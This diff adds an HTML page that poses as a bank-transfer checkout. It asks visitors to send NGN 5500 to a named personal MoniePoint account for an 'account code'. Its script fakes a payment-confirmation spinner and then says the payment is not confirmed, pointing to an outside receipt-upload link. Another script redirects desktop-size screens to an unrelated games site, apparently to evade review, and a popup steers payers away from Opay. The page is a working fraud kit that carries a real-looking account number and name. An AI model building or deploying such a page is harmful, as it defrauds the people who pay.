@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="fontawesome-free-6.2.0-web/css/all.css">
+    <script src="js.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,400;0,500;1,900&display=swap');
+        * {padding: 0;margin: 0;font-family: 'Poppins', sans-serif;}
+        .top {width: 100%; height: 39px; margin-top: 30px; background: rgb(208, 206, 206);}
+        .top p {padding-top: 6px; padding-left: 20px;}
+        .amount {width: 100%; height: 120px; background: #ffffff;}
+        .amount h3 {float: right; position: relative; bottom: -20px; padding-right: 12px;}
+        .amount p {float: right; padding-right: 12px;}
+        .amount img {width: 100px; position: relative; top: -36px;}
+        .tp p {text-align: center;}
+        .box {width: 95%; margin: 0 auto; border: 1px solid grey; background: #f5f2f2;}
+        .box h3, p {padding-left: 15px;}
+        .copy-button {float: right; margin-right: 15px; background-color: orange; color: white; border: none; cursor: pointer; position: relative; top: -20px; width: 50px;}
+        .btn button {width: 89%; height: 39px; margin: 0 auto; display: block; border: none; background: orange;}
+        #spinner, #transferCompleteMessage {text-align: center; font-size: 20px; display: none; margin-top: 20px;}
+        @keyframes spin {0% {transform: rotate(0deg);} 100% {transform: rotate(360deg);}}
+        .spinner {border: 4px solid rgba(255,255,255,0.3); border-top: 4px solid orange; border-radius: 50%; width: 30px; height: 30px; animation: spin .7s linear infinite; margin: 0 auto; margin-top: 20px;}
+        .bc {width: 90%; height: 50px; margin: 0 auto; border: 1px solid rgb(233,232,232); background: #f2f2f2;}
+        .bb i {width: 25px; height: 25px; clip-path: circle(); color: green; float: right; position: relative; left: -20px; top: 12px;}
+        .spinners {width: 20px; height: 20px; border: 8px solid rgba(255,255,255,0.3); border-top: 8px solid orange; border-radius: 50%; animation: spin .2s linear infinite; margin: 50px auto; float: right; position: relative; top: -39px;}
+        @media screen and (max-width: 768px) {
+            .amount h3 {font-size: 15px;}
+            .amount p {font-size: 18px;}
+            .amount img {width: 80px; top: -45px;}
+            .tp p {font-size: 15px;}
+            .box {width: 90%;}
+            .box h3, p {font-size: 13px;}
+            .copy-button {width: 40px;}
+        }
+    </style>
+</head>
+<body>
+    <marquee></marquee>
+    <div class="top"><p>Bank Transfer <span style="float: right; padding-right: 10px; color: red;">Cancel</span></p></div>
+    <div class="amount"><h3>NGN <span>5500</span></h3><br><br><p style="font-size: 11px;" id="email"></p><img src="img/fl logo.png" alt=""><br><br></div>
+    <div class="tp"><p>Proceed to your bank app to complete this Transfer</p></div><br>
+    <div id="spinner"><div class="spinner"></div><p> Wait while we confirm your payment... </p><br><br><div class="bc"><p style="float: left; font-size: 13px; padding-top: 12px;"> Payment Made <div class="bb"><i class="fa-solid fa-circle-check"></i></div></p></div><br><div class="bc"><p style="float: left; font-size: 13px; padding-top: 12px;">Confirming Payment <div class="spinners"></div></p></div></div>
+    <div id="transferCompleteMessage"><p style="font-size: 13px;">Payment not confirmed, upload receipts : </p><a style="font-size: 13px;" href="https://appsapk.com.ng/upload/upload.php">here</a><br><button style="width: 130px; margin: 0 auto; display: block; height: 37px; border: none; background: green;"><a style="text-decoration: none; color: white;" href="">Re-check</a></button></div>
+    <div class="box"><br><p>Amount</p><h3>NGN <span id="amountToCopy">5500</span></h3><button class="copy-button" onclick="copyText('amountToCopy')">Copy</button><br><p>Account Number</p><h3 id="accountNumberToCopy"> 5056900684 </h3><button class="copy-button" onclick="copyText('accountNumberToCopy')">Copy</button><br><p>Bank Name</p><h3>MoniePoint Bank</h3><br><p>Account Name</p><h3>Mathew Solomon</h3><br><hr><br><p>Pay to this specific account and get your account your account code</p><br><div class="btn"><button id="transferButton" onclick="startTransfer()">I have made this bank Transfer</button><br></div></div><br>
+
+    <script>
+        function copyText(elementId) {
+            var textToCopy = document.getElementById(elementId).textContent;
+            var dummyElement = document.createElement("textarea");
+            document.body.appendChild(dummyElement);
+            dummyElement.value = textToCopy;
+            dummyElement.select();
+            document.execCommand("copy");
+            document.body.removeChild(dummyElement);
+            alert("Copied: " + textToCopy);
+        }
+        function startTransfer() {
+            document.querySelector('.box').style.display = 'none';
+            document.getElementById('spinner').style.display = 'block';
+            setTimeout(() => {
+                document.getElementById('spinner').style.display = 'none';
+                document.getElementById('transferCompleteMessage').style.display = 'block';
+            }, 15000);
+        }
+        const { fullName, email } = (() => {
+            const q = new URLSearchParams(window.location.search);
+            return { fullName: q.get('fullName'), email: q.get('email') };
+        })();
+        document.getElementById('email').textContent += email;
+    </script>
+    <script>if (window.innerWidth >= 768) window.location.href = "https://www.miniclip.com/";</script>
+
+    <!-- ✅ FINAL POPUP with voice note -->
+    <script>
+        window.onload = function() {
+            setTimeout(() => { showPopup(); }, 1000);
+        }
+        function showPopup() {
+            let popup = document.createElement('div');
+            popup.style.position = 'fixed';
+            popup.style.top = '50%';
+            popup.style.left = '50%';
+            popup.style.transform = 'translate(-50%, -50%)';
+            popup.style.background = '#fff';
+            popup.style.border = '3px solid orange';
+            popup.style.padding = '20px';
+            popup.style.boxShadow = '0 0 15px rgba(0,0,0,0.6)';
+            popup.style.zIndex = '9999';
+            popup.style.textAlign = 'center';
+            popup.style.maxWidth = '95%';
+            popup.style.width = '320px';
+            popup.style.borderRadius = '12px';
+            popup.style.boxSizing = 'border-box';
+            popup.style.fontFamily = 'Poppins, sans-serif';
+            popup.innerHTML = `
+                <h3 style="color: orange; margin-bottom: 10px;">Payment Instruction</h3>
+                <p style="font-size: 14px; line-height: 1.5;">Do Not use opay to make your payment<br><br>You can also listen to the voice instructions below:</p>
+                <audio controls style="width: 100%; margin-top: 10px;">
+                    <source src="voice.mp3" type="audio/mpeg">
+                    Your browser does not support the audio element.
+                </audio>
+                <br><br>
+                <button onclick="document.body.removeChild(this.parentNode)" style="padding: 8px 20px; background: orange; color: white; border: none; cursor: pointer; border-radius: 5px; font-size: 14px;">OK</button>
+            `;
+            document.body.appendChild(popup);
+        }
+    </script>
+</body>
+</html>
